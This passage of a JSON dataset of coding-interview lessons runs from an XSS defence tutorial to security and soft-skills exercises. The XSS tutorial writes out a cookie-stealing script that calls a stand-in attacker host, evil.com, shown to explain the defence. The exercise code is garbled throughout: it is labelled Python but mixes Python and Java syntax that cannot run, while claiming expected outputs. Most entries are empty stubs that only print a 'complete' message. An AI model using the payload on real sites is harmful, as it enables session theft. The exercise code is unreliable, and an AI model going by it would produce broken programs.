      "tutorial": "<div class=\"tutorial-content\">\n<h3>Security: XSS (Cross-Site Scripting) Defense</h3>\n\n<h4>Introduction</h4>\n<p>XSS is #7 in OWASP Top 10. Attackers inject malicious scripts into web pages viewed by other users. Can steal cookies, session tokens, or redirect to phishing sites. Prevention requires output encoding and Content Security Policy.</p>\n\n<h4>Types of XSS</h4>\n<ul>\n<li><strong>Stored XSS:</strong> Malicious script stored in database (e.g., comment with <script> tag)</li>\n<li><strong>Reflected XSS:</strong> Script in URL parameter reflected in response</li>\n<li><strong>DOM-based XSS:</strong> Client-side JavaScript modifies DOM with untrusted data</li>\n</ul>\n\n<h4>Attack Example</h4>\n<pre><code>// Attacker posts comment:\n\"Check this out! <script>\n  fetch('https://evil.com/steal?cookie=' + document.cookie)\n</script>\"\n\n// If displayed without escaping:\n<div class=\"comment\">\n  Check this out! <script>\n    fetch('https://evil.com/steal?cookie=' + document.cookie)\n  </script>\n</div>\n\n// Result: All users viewing this comment send their cookies to attacker!</code></pre>\n\n<h4>Defense #1: Output Encoding</h4>\n<pre><code>// Always escape HTML special characters\nfunction escapeHtml(text) {\n    return text\n        .replace(/&/g, \"&amp;\")   // & → &amp;\n        .replace(/</g, \"&lt;\")    // < → &lt;\n        .replace(/>/g, \"&gt;\")    // > → &gt;\n        .replace(/\"/g, \"&quot;\")  // \" → &quot;\n        .replace(/'/g, \"&#x27;\")  // ' → &#x27;\n        .replace(/\\//g, \"&#x2F;\");// / → &#x2F;\n}\n\n// Safe output:\n\"<script>alert('XSS')</script>\"\nbecomes\n\"&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;\"</code></pre>\n\n<h4>Defense #2: Content Security Policy (CSP)</h4>\n<pre><code>// HTTP Header to prevent inline scripts\nContent-Security-Policy:\n  default-src 'self';\n  script-src 'self' https://trusted-cdn.com;\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' data:;\n\n// This blocks:\n- Inline <script> tags\n- eval() and new Function()\n- javascript: URLs\n- Untrusted external scripts</code></pre>\n\n<h4>Defense #3: HTTPOnly Cookies</h4>\n<pre><code>// Prevent JavaScript from accessing cookies\nSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n\n// Even if XSS happens, attacker can't steal session cookie\n// document.cookie returns empty string</code></pre>\n\n<h4>Real-World Incidents</h4>\n<p><strong>MySpace (2005):</strong> Samy worm infected 1M users in 20 hours via stored XSS. Displayed \"Samy is my hero\" on profiles.</p>\n<p><strong>Twitter (2010):</strong> Reflected XSS in tweet hover allowed pop-ups. Fixed in hours but affected millions.</p>\n<p><strong>eBay (2014):</strong> Stored XSS in product listings. Attackers redirected users to phishing sites.</p>\n\n<h4>Best Practices</h4>\n<ul>\n<li><strong>Always escape output:</strong> Use template engines (Thymeleaf, JSP) with auto-escaping</li>\n<li><strong>Never trust user input:</strong> Escape on output, not input (preserve original data)</li>\n<li><strong>Use CSP headers:</strong> Block inline scripts completely</li>\n<li><strong>HTTPOnly cookies:</strong> Prevent cookie theft even if XSS occurs</li>\n<li><strong>Validate input:</strong> Whitelist allowed HTML tags if rich text needed</li>\n<li><strong>Use libraries:</strong> OWASP Java HTML Sanitizer, DOMPurify (JavaScript)</li>\n</ul>\n\n<h4>Framework-Specific Protection</h4>\n<p><strong>React:</strong> Auto-escapes by default. Use dangerouslySetInnerHTML sparingly.</p>\n<p><strong>Angular:</strong> Sanitizes values automatically in templates.</p>\n<p><strong>Spring MVC:</strong> Thymeleaf escapes by default. Use th:text not th:utext.</p>\n\n<h4>Interview Tips</h4>\n<ul>\n<li>Explain difference between Stored, Reflected, and DOM-based XSS</li>\n<li>Know when to escape: HTML context, JavaScript context, URL context (different rules!)</li>\n<li>Discuss CSP as defense-in-depth (not primary defense)</li>\n<li>Mention HttpOnly cookies to prevent cookie theft</li>\n</ul>\n</div>",
      "tags": [
        "Security",
        "XSS",
        "OWASP",
        "Web Security",
        "FAANG"
      ]
    },
    {
      "id": 633,
      "title": "CSRF Tokens",
      "description": "Request forgery prevention",
      "language": "python",
      "initialCode": "// CSRF Tokens\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"CSRF Tokens complete\");\n    }\n}",
      "expectedOutput": "CSRF Tokens complete",
      "tutorial": "<div class='tutorial-content'><h3>CSRF Tokens</h3><p>Request forgery prevention</p></div>",
      "tags": [
        "Security",
        "FAANG"
      ]
    },
    {
      "id": 634,
      "title": "Password Hashing",
      "description": "bcrypt/Argon2",
      "language": "python",
      "initialCode": "// Password Hashing\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Password Hashing complete\");\n    }\n}",
      "expectedOutput": "Password Hashing complete",
      "tutorial": "<div class='tutorial-content'><h3>Password Hashing</h3><p>bcrypt/Argon2</p></div>",
      "tags": [
        "Security",
        "FAANG"
      ]
    },
    {
      "id": 635,
      "title": "HTTPS/TLS",
      "description": "Certificate management",
      "language": "python",
      "initialCode": "// HTTPS/TLS\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"HTTPS/TLS complete\");\n    }\n}",
      "expectedOutput": "HTTPS/TLS complete",
      "tutorial": "<div class='tutorial-content'><h3>HTTPS/TLS</h3><p>Certificate management</p></div>",
      "tags": [
        "Security",
        "FAANG"
      ]
    },
    {
      "id": 636,
      "title": "Security Headers",
      "description": "HSTS, CSP",
      "language": "python",
      "initialCode": "// Security Headers\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Security Headers complete\");\n    }\n}",
      "expectedOutput": "Security Headers complete",
      "tutorial": "<div class='tutorial-content'><h3>Security Headers</h3><p>HSTS, CSP</p></div>",
      "tags": [
        "Security",
        "FAANG"
      ]
    },
    {
      "id": 637,
      "title": "Input Validation",
      "description": "Sanitization",
      "language": "python",
      "initialCode": "// Input Validation\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Input Validation complete\");\n    }\n}",
      "expectedOutput": "Input Validation complete",
      "tutorial": "<div class='tutorial-content'><h3>Input Validation</h3><p>Sanitization</p></div>",
      "tags": [
        "Security",
        "FAANG"
      ]
    },
    {
      "id": 638,
      "title": "CORS Setup",
      "description": "Cross-origin config",
      "language": "python",
      "initialCode": "// CORS Setup\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"CORS Setup complete\");\n    }\n}",
      "expectedOutput": "CORS Setup complete",
      "tutorial": "<div class='tutorial-content'><h3>CORS Setup</h3><p>Cross-origin config</p></div>",
      "tags": [
        "Security",
        "FAANG"
      ]
    },
    {
      "id": 639,
      "title": "Secrets Management",
      "description": "Environment vars",
      "language": "python",
      "initialCode": "// Secrets Management\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Secrets Management complete\");\n    }\n}",
      "expectedOutput": "Secrets Management complete",
      "tutorial": "<div class='tutorial-content'><h3>Secrets Management</h3><p>Environment vars</p></div>",
      "tags": [
        "Security",
        "FAANG"
      ]
    },
    {
      "id": 640,
      "title": "Vulnerability Scanning",
      "description": "Dependency check",
      "language": "python",
      "initialCode": "// Vulnerability Scanning\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Vulnerability Scanning complete\");\n    }\n}",
      "expectedOutput": "Vulnerability Scanning complete",
      "tutorial": "<div class='tutorial-content'><h3>Vulnerability Scanning</h3><p>Dependency check</p></div>",
      "tags": [
        "Security",
        "FAANG"
      ]
    },
    {
      "id": 641,
      "title": "Code Review Best Practices",
      "description": "Learn to conduct effective code reviews with constructive feedback and collaboration",
      "language": "python",
      "initialCode": "// Code Review Exercise\n// Review this code and identify improvements\n\nimport java.util.*;\n\ndef main() {\n    // Code to review:\n    public static void processData(List<String> data) {\n        for(int i=0;i<data.size();i++) {\n            String item=data.get(i);\n            if(item!=null) {\n                print(item.toUpperCase());\n            }\n        }\n    }\n\n    // TODO: List code review comments\n    // Consider: readability, performance, null safety\n\n    public static void main(String[] args) {\n        List<String> data = Arrays.asList(\"apple\", \"banana\", null, \"cherry\");\n        processData(data);\n    }\n}",
      "fullSolution": "import java.util.*;\n\ndef main() {\n    // ORIGINAL (with issues):\n    public static void processDataOld(List<String> data) {\n        for(int i=0;i<data.size();i++) {\n            String item=data.get(i);\n            if(item!=null) {\n                print(item.toUpperCase());\n            }\n        }\n    }\n\n    // IMPROVED (after code review):\n    public static void processData(List<String> data) {\n        if (data == null || data.isEmpty()) {\n            return;\n        }\n\n        for (String item : data) {  // Enhanced for loop\n            if (item != null) {     // Proper spacing\n                print(item.toUpperCase());\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        List<String> data = Arrays.asList(\"apple\", \"banana\", null, \"cherry\");\n\n        print(\"Original:\");\n        processDataOld(data);\n\n        print(\"\\nImproved:\");\n        processData(data);\n\n        print(\"\\nReview Comments:\");\n        print(\"1. Use enhanced for loop (more readable)\");\n        print(\"2. Add spacing around operators\");\n        print(\"3. Add null check on input list\");\n    }\n}",
      "expectedOutput": "Original:\nAPPLE\nBANANA\nCHERRY\n\nImproved:\nAPPLE\nBANANA\nCHERRY\n\nReview Comments:\n1. Use enhanced for loop (more readable)\n2. Add spacing around operators\n3. Add null check on input list",
      "tutorial": "<div class=\"tutorial-content\">\n<h3>Soft Skills: Code Review Best Practices</h3>\n\n<h4>Introduction</h4>\n<p>Code reviews are essential for code quality, knowledge sharing, and catching bugs. Effective reviews balance thoroughness with speed, and provide constructive feedback that improves both code and developers.</p>\n\n<h4>What to Review</h4>\n<ul>\n<li><strong>Logic:</strong> Does the code work correctly?</li>\n<li><strong>Edge Cases:</strong> Null, empty, boundary values handled?</li>\n<li><strong>Performance:</strong> Algorithm complexity, unnecessary loops</li>\n<li><strong>Security:</strong> SQL injection, XSS, authentication</li>\n<li><strong>Readability:</strong> Clear naming, comments, structure</li>\n<li><strong>Tests:</strong> Coverage, meaningful assertions</li>\n</ul>\n\n<h4>Good Review Comments</h4>\n<pre><code>❌ BAD: \"This is wrong\"\n✅ GOOD: \"Consider enhanced for loop for readability\"\n\n❌ BAD: \"Terrible naming\"\n✅ GOOD: \"Variable 'x' could be more descriptive, like 'userId'\"\n\n✅ PRAISE: \"Nice refactoring! Much more readable.\"</code></pre>\n\n<h4>Review Etiquette</h4>\n<ul>\n<li>Review promptly (don't block teammates)</li>\n<li>Be kind (there's a person behind the code)</li>\n<li>Ask questions instead of demanding changes</li>\n<li>Praise good code (positive reinforcement)</li>\n<li>Label minor suggestions as \"nit:\" (not blocking)</li>\n</ul>\n\n<h4>Real-World Examples</h4>\n<p><strong>Google:</strong> Requires ≥1 reviewer. Average review time: 4 hours.</p>\n<p><strong>Microsoft:</strong> Code reviews reduced bugs by 60%.</p>\n<p><strong>Facebook:</strong> \"Ship, then fix\" culture, but reviews prevent critical bugs.</p>\n\n<h4>Best Practices</h4>\n<ul>\n<li>Self-review before requesting review</li>\n<li>Keep PRs small (<400 lines optimal)</li>\n<li>Use linters for style issues (automate)</li>\n<li>Provide context in PR description</li>\n<li>Both reviewer and author learn from process</li>\n</ul>\n</div>",
      "tags": [
        "Soft Skills",
        "Code Review",
        "Collaboration",
        "Best Practices"
      ]
    },
    {
      "id": 642,
      "title": "Writing Technical Documentation",
      "description": "Create clear, comprehensive technical documentation including README, API docs, and architecture guides",
      "language": "python",
      "initialCode": "// Technical Documentation Exercise\n// Task: Document this utility class\n// TODO: Add class-level Javadoc\n// TODO: Add method-level Javadoc with @param and @return\n\nimport java.util.*;\n\ndef main() {\n    static class StringUtils {\n        public static boolean isPalindrome(String str) {\n            String clean = str.replaceAll(\"[^a-zA-Z0-9]\", \"\").toLowerCase();\n            int left = 0, right = clean.length() - 1;\n            while (left < right) {\n                if (clean.charAt(left) != clean.charAt(right)) return false;\n                left++;\n                right--;\n            }\n            return true;\n        }\n    }\n\n    public static void main(String[] args) {\n        print(StringUtils.isPalindrome(\"A man, a plan, a canal: Panama\"));\n    }\n}",
      "fullSolution": "import java.util.*;\n\ndef main() {\n    /**\n     * Utility class for string operations.\n     *\n     * <p>This class provides common string manipulation methods\n     * including palindrome checking, case conversion, and validation.\n     * All methods are static and the class cannot be instantiated.</p>\n     *\n     * <p>Example usage:\n     * <pre>{@code\n     * boolean result = StringUtils.isPalindrome(\"racecar\");\n     * // result = true\n     * }</pre>\n     *\n     * @author Your Name\n     * @version 1.0\n     * @since 2025-01-01\n     */\n    static class StringUtils {\n        /**\n         * Checks if a string is a palindrome.\n         *\n         * <p>A palindrome reads the same forwards and backwards,\n         * ignoring spaces, punctuation, and case. Examples:\n         * <ul>\n         *   <li>\"racecar\" → true</li>\n         *   <li>\"A man, a plan, a canal: Panama\" → true</li>\n         *   <li>\"hello\" → false</li>\n         * </ul>\n         *\n         * <p><strong>Algorithm:</strong> Two-pointer approach from both ends.\n         * Time complexity: O(n), Space complexity: O(n) for cleaned string.\n         *\n         * @param str the string to check (can contain spaces and punctuation)\n         * @return {@code true} if the string is a palindrome, {@code false} otherwise\n         * @throws NullPointerException if str is null\n         *\n         * @see <a href=\"https://en.wikipedia.org/wiki/Palindrome\">Palindrome on Wikipedia</a>\n         */\n        public static boolean isPalindrome(String str) {\n            if (str == null) throw new NullPointerException(\"Input string cannot be null\");\n\n            // Remove non-alphanumeric characters and convert to lowercase\n            String clean = str.replaceAll(\"[^a-zA-Z0-9]\", \"\").toLowerCase();\n\n            // Two-pointer comparison\n            int left = 0, right = clean.length() - 1;\n            while (left < right) {\n                if (clean.charAt(left) != clean.charAt(right)) {\n                    return false;\n                }\n                left++;\n                right--;\n            }\n            return true;\n        }\n    }\n\n    public static void main(String[] args) {\n        // Example 1: Classic palindrome\n        print(\"'racecar': \" + StringUtils.isPalindrome(\"racecar\"));\n\n        // Example 2: Palindrome with punctuation\n        print(\"'A man, a plan, a canal: Panama': \" +\n            StringUtils.isPalindrome(\"A man, a plan, a canal: Panama\"));\n\n        // Example 3: Not a palindrome\n        print(\"'hello': \" + StringUtils.isPalindrome(\"hello\"));\n    }\n}",
      "expectedOutput": "'racecar': true\n'A man, a plan, a canal: Panama': true\n'hello': false",
      "tutorial": "<div class=\"tutorial-content\">\n<h3>Soft Skills: Writing Technical Documentation</h3>\n\n<h4>Introduction</h4>\n<p>Good documentation is as important as good code. It helps teammates understand your work, reduces onboarding time, and serves as reference for future maintenance. Poor documentation costs companies millions in lost productivity.</p>\n\n<h4>Types of Documentation</h4>\n<ul>\n<li><strong>README:</strong> Project overview, setup instructions, usage examples</li>\n<li><strong>API Documentation:</strong> Function/method signatures, parameters, return values</li>\n<li><strong>Architecture Docs:</strong> System design, component relationships, data flow</li>\n<li><strong>Code Comments:</strong> Inline explanations for complex logic</li>\n<li><strong>Runbooks:</strong> Operational procedures, troubleshooting guides</li>\n</ul>\n\n<h4>README Structure</h4>\n<pre><code># Project Name\n\nBrief description (1-2 sentences)\n\n## Features\n- Feature 1\n- Feature 2\n\n## Installation\n```bash\nnpm install\n```\n\n## Usage\n```javascript\nconst result = myFunction();\n```\n\n## API Reference\nSee [API.md](API.md)\n\n## Contributing\nSee [CONTRIBUTING.md](CONTRIBUTING.md)\n\n## License\nMIT</code></pre>\n\n<h4>Javadoc Best Practices</h4>\n<pre><code>/**\n * Brief one-line summary.\n *\n * <p>Detailed description with examples, constraints,\n * and edge cases. Use HTML tags for formatting.\n *\n * <pre>{@code\n * // Code example\n * int result = myMethod(5);\n * }</pre>\n *\n * @param name parameter description\n * @return return value description\n * @throws ExceptionType when this is thrown\n * @see RelatedClass#relatedMethod()\n * @since 1.0\n */</code></pre>\n\n<h4>Writing Guidelines</h4>\n<ul>\n<li><strong>Audience-Aware:</strong> Write for your target reader (junior dev, ops team, customer)</li>\n<li><strong>Examples First:</strong> Show usage before explaining internals</li>\n<li><strong>Be Concise:</strong> Remove unnecessary words, prefer bullet points</li>\n<li><strong>Keep Updated:</strong> Update docs when code changes (CI check)</li>\n<li><strong>Use Diagrams:</strong> Architecture diagrams, sequence diagrams, flowcharts</li>\n</ul>\n\n<h4>Real-World Examples</h4>\n<p><strong>Stripe API Docs:</strong> Gold standard. Clear examples, error codes, SDKs in multiple languages. Developers love Stripe partly due to excellent docs.</p>\n<p><strong>Kubernetes Docs:</strong> Complex system made accessible. Tutorials, concepts, reference guides organized by user journey.</p>\n<p><strong>React Docs:</strong> Interactive examples, clear API reference, troubleshooting guides.</p>\n\n<h4>Documentation Tools</h4>\n<ul>\n<li><strong>Javadoc:</strong> Auto-generate HTML from Java comments</li>\n<li><strong>Sphinx:</strong> Python documentation generator</li>\n<li><strong>Swagger/OpenAPI:</strong> API documentation from specs</li>\n<li><strong>Docusaurus:</strong> Facebook's documentation site generator</li>\n<li><strong>MkDocs:</strong> Markdown-based documentation</li>\n</ul>\n\n<h4>Common Mistakes</h4>\n<ul>\n<li><strong>Obvious Comments:</strong> \"// increment i\" for i++ (waste of space)</li>\n<li><strong>Outdated Docs:</strong> Worse than no docs (misleads developers)</li>\n<li><strong>No Examples:</strong> Theory without practice is hard to understand</li>\n<li><strong>Too Technical:</strong> Assuming too much knowledge from reader</li>\n<li><strong>Missing Context:</strong> Not explaining \"why\", only \"what\"</li>\n</ul>\n\n<h4>Interview Relevance</h4>\n<ul>\n<li><strong>Google:</strong> Emphasizes clear communication. May ask about documentation strategy</li>\n<li><strong>Amazon:</strong> Leadership principle \"Insist on Highest Standards\" includes docs</li>\n<li><strong>Microsoft:</strong> Strong documentation culture (Office, Azure, VS Code)</li>\n</ul>\n\n<h4>Career Impact</h4>\n<p>Senior engineers are evaluated on documentation quality. Staff/Principal engineers write design docs, RFCs, and architecture guides. Clear writing accelerates promotion.</p>\n\n<h4>Best Practices Checklist</h4>\n<ul>\n<li>✅ README with quick start guide</li>\n<li>✅ API docs with examples</li>\n<li>✅ Architecture diagram (C4 model)</li>\n<li>✅ Troubleshooting section</li>\n<li>✅ Contributing guidelines</li>\n<li>✅ Changelog (semantic versioning)</li>\n<li>✅ License file</li>\n</ul>\n</div>",
      "tags": [
        "Soft Skills",
        "Documentation",
        "Communication",
        "Career",
        "FAANG"
      ]
    },
    {
      "id": 643,
      "title": "Debugging Strategies",
      "description": "Systematic approach",
      "language": "python",
      "initialCode": "// Debugging Strategies\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Debugging Strategies complete\");\n    }\n}",
      "expectedOutput": "Debugging Strategies complete",
      "tutorial": "<div class='tutorial-content'><h3>Debugging Strategies</h3><p>Systematic approach</p></div>",
      "tags": [
        "Soft Skills",
        "FAANG"
      ]
    },
    {
      "id": 644,
      "title": "Git Workflow",
      "description": "Feature branches",
      "language": "python",
      "initialCode": "// Git Workflow\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Git Workflow complete\");\n    }\n}",
      "expectedOutput": "Git Workflow complete",
      "tutorial": "<div class='tutorial-content'><h3>Git Workflow</h3><p>Feature branches</p></div>",
      "tags": [
        "Soft Skills",
        "FAANG"
      ]
    },
    {
      "id": 645,
      "title": "Performance Profiling",
      "description": "CPU/memory analysis",
      "language": "python",
      "initialCode": "// Performance Profiling\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Performance Profiling complete\");\n    }\n}",
      "expectedOutput": "Performance Profiling complete",
      "tutorial": "<div class='tutorial-content'><h3>Performance Profiling</h3><p>CPU/memory analysis</p></div>",
      "tags": [
        "Soft Skills",
        "FAANG"
      ]
    },
    {
      "id": 646,
      "title": "Stack Traces",
      "description": "Error diagnosis",
      "language": "python",
      "initialCode": "// Stack Traces\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Stack Traces complete\");\n    }\n}",
      "expectedOutput": "Stack Traces complete",
      "tutorial": "<div class='tutorial-content'><h3>Stack Traces</h3><p>Error diagnosis</p></div>",
      "tags": [
        "Soft Skills",
        "FAANG"
      ]
    },
    {
      "id": 647,
      "title": "Story Point Estimation",
      "description": "Agile sizing",
      "language": "python",
      "initialCode": "// Story Point Estimation\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Story Point Estimation complete\");\n    }\n}",
      "expectedOutput": "Story Point Estimation complete",
      "tutorial": "<div class='tutorial-content'><h3>Story Point Estimation</h3><p>Agile sizing</p></div>",
      "tags": [
        "Soft Skills",
        "FAANG"
      ]
    },
    {
      "id": 648,
      "title": "Agile/Scrum",
      "description": "Sprint planning",
      "language": "python",
      "initialCode": "// Agile/Scrum\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Agile/Scrum complete\");\n    }\n}",
      "expectedOutput": "Agile/Scrum complete",
      "tutorial": "<div class='tutorial-content'><h3>Agile/Scrum</h3><p>Sprint planning</p></div>",
      "tags": [
        "Soft Skills",
        "FAANG"
      ]
    },
    {
      "id": 649,
      "title": "Stakeholder Communication",
      "description": "Business translation",
      "language": "python",
      "initialCode": "// Stakeholder Communication\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Stakeholder Communication complete\");\n    }\n}",
      "expectedOutput": "Stakeholder Communication complete",
      "tutorial": "<div class='tutorial-content'><h3>Stakeholder Communication</h3><p>Business translation</p></div>",
      "tags": [
        "Soft Skills",
        "FAANG"
      ]
    },
    {
      "id": 650,
      "title": "Building Portfolio",
      "description": "GitHub showcase",
      "language": "python",
      "initialCode": "// Building Portfolio\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Building Portfolio complete\");\n    }\n}",
      "expectedOutput": "Building Portfolio complete",
      "tutorial": "<div class='tutorial-content'><h3>Building Portfolio</h3><p>GitHub showcase</p></div>",
      "tags": [
        "Soft Skills",
        "FAANG"
      ]
    }
  ]
}